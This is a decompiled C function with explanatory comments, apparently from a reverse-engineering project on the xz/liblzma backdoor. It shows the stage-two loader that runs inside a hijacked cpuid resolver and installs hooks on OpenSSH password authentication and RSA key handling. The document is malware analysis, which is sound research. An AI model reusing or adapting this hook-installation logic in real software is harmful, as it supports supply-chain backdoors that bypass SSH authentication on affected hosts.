// /home/kali/xzre-ghidra/xzregh/106F30_backdoor_init_stage2.c
// Function: backdoor_init_stage2 @ 0x106F30
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_init_stage2(elf_entry_ctx_t * ctx, u64 * caller_frame, void * * cpuid_got_addr, backdoor_cpuid_reloc_consts_t * reloc_consts)


/*
 * AutoDoc: Runs inside the hijacked cpuid resolver. It allocates temporary `backdoor_shared_globals_t`,
 * `backdoor_hooks_ctx_t`, and `backdoor_setup_params_t` blocks, repeatedly calls `init_hooks_ctx()` until the shared globals are
 * available, and then hands the bundle to `backdoor_setup`. If setup fails after the retries it zeros the GOT bookkeeping and
 * defers to the genuine cpuid implementation so liblzma still satisfies glibc’s contract.
 */

#include "xzre_types.h"

BOOL backdoor_init_stage2
               (elf_entry_ctx_t *ctx,u64 *caller_frame,void **cpuid_got_addr,
               backdoor_cpuid_reloc_consts_t *reloc_consts)

{
  int *max_leaf_info;
  undefined4 *cpuid_info;
  u32 cpuid_ebx;
  u32 cpuid_ecx;
  u32 cpuid_edx;
  int hooks_init_status;
  BOOL stage2_success;
  long wipe_idx;
  backdoor_shared_globals_t *shared_globals_ptr;
  backdoor_hooks_ctx_t *extraout_RDX;
  backdoor_hooks_ctx_t *hooks_ctx_cursor;
  backdoor_hooks_ctx_t *extraout_RDX_00;
  backdoor_setup_params_t *setup_params_cursor;
  backdoor_setup_params_t setup_params;
  backdoor_hooks_ctx_t hooks_ctx;
  backdoor_shared_globals_t shared_globals;
  backdoor_shared_globals_t local_140;
  backdoor_hooks_ctx_t local_128;
  backdoor_setup_params_t local_a0;
  
  hooks_ctx_cursor = &local_128;
  // AutoDoc: Blank the on-stack `backdoor_hooks_ctx_t` so every bootstrap scratch slot starts predictable before we call `init_hooks_ctx()`.
  for (wipe_idx = 0x22; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
    hooks_ctx_cursor->bootstrap_scratch[0] = '\0';
    hooks_ctx_cursor->bootstrap_scratch[1] = '\0';
    hooks_ctx_cursor->bootstrap_scratch[2] = '\0';
    hooks_ctx_cursor->bootstrap_scratch[3] = '\0';
    hooks_ctx_cursor = (backdoor_hooks_ctx_t *)(hooks_ctx_cursor->bootstrap_scratch + 4);
  }
  setup_params_cursor = &local_a0;
  // AutoDoc: Apply the same zeroing pass to `backdoor_setup_params_t`; it will later carry pointers handed to `backdoor_setup()`.
  for (wipe_idx = 0x22; wipe_idx != 0; wipe_idx = wipe_idx + -1) {
    setup_params_cursor->bootstrap_padding[0] = '\0';
    setup_params_cursor->bootstrap_padding[1] = '\0';
    setup_params_cursor->bootstrap_padding[2] = '\0';
    setup_params_cursor->bootstrap_padding[3] = '\0';
    setup_params_cursor = (backdoor_setup_params_t *)(setup_params_cursor->bootstrap_padding + 4);
  }
  local_140.authpassword_hook_entry = mm_answer_authpassword_hook;
  local_140.evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
  local_140.global_ctx_slot = (global_context_t **)&global_ctx;
  lzma_check_init(&local_a0.dummy_check_state,LZMA_CHECK_NONE);
  shared_globals_ptr = &local_140;
  // AutoDoc: Prime the hooks context once before entering the retry loop so we can immediately call `backdoor_setup` if shared globals are ready.
  hooks_init_status = init_hooks_ctx(&local_128);
  hooks_ctx_cursor = extraout_RDX;
  do {
    if (hooks_init_status == 0) {
      local_a0.shared_globals = shared_globals_ptr;
      local_a0.entry_ctx = ctx;
      // AutoDoc: Hand the fully-populated params to `backdoor_setup`; success means the hooks installed and we never fall back to real CPUID.
      stage2_success = backdoor_setup(&local_a0);
      return stage2_success;
    }
    local_128.shared_globals_ptr = shared_globals_ptr;
    hooks_init_status = init_hooks_ctx(hooks_ctx_cursor);
    hooks_ctx_cursor = extraout_RDX_00;
  } while (hooks_init_status != 5);
  // AutoDoc: If we burned through the retries, zero the GOT bookkeeping and defer to glibc’s cpuid resolver so execution can continue safely.
  ctx->cpuid_random_symbol_addr = (void *)0x1;
  (ctx->got_ctx).tls_got_entry = (void *)0x0;
  (ctx->got_ctx).cpuid_got_slot = (void *)0x0;
  (ctx->got_ctx).cpuid_slot_index = 0;
  (ctx->got_ctx).got_base_offset = 0;
  max_leaf_info = (int *)cpuid_basic_info(0);
  if (*max_leaf_info != 0) {
    cpuid_info = (undefined4 *)cpuid_Version_info(1);
    cpuid_ebx = cpuid_info[1];
    cpuid_ecx = cpuid_info[2];
    cpuid_edx = cpuid_info[3];
    *(undefined4 *)&(ctx->got_ctx).tls_got_entry = *cpuid_info;
    *(undefined4 *)&(ctx->got_ctx).cpuid_got_slot = cpuid_ebx;
    *(undefined4 *)&(ctx->got_ctx).cpuid_slot_index = cpuid_edx;
    *(undefined4 *)&(ctx->got_ctx).got_base_offset = cpuid_ecx;
  }
  return FALSE;
}

